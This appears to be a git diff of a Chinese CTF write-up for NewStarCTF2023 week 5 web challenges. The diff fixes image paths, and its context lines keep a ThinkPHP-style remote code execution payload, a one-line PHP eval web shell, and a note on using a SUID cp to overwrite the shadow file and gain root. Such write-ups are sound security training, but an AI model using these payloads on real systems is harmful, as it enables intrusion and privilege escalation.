@@ -3,7 +3,7 @@ title: NewStarCTF2023 week5 web前两题
 date: 2023-10-30 16:48 +0800
 categories: [CTF,WEB]
 tags: [web]
-media_subpath: /assets
+media_subpath: /
 ---
 
 
@@ -87,7 +87,7 @@ _method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1
 
 
 
-![image-20231030131251182](image-20231030131251182.png)
+![image-20231030131251182](assets/image-20231030131251182.png)
 
 payload：
 
@@ -106,9 +106,9 @@ echo '<?php @eval($_POST[12]); ?>' > 1.php
 
 查看suid 存在cp，我们可以直接cp shadow 查看 root 密码，这里的root 没有显示密码，我们直接修改shadow 
 
-![image-20231030162316084](image-20231030162316084.png)
+![image-20231030162316084](assets/image-20231030162316084.png)
 
-![image-20231030164151705](image-20231030164151705.png)
+![image-20231030164151705](assets/image-20231030164151705.png)
 
 
 
@@ -131,4 +131,4 @@ su root
 cat /flag*
 ```
 
-![image-20231030164051944](image-20231030164051944.png)
+![image-20231030164051944](assets/image-20231030164051944.png)
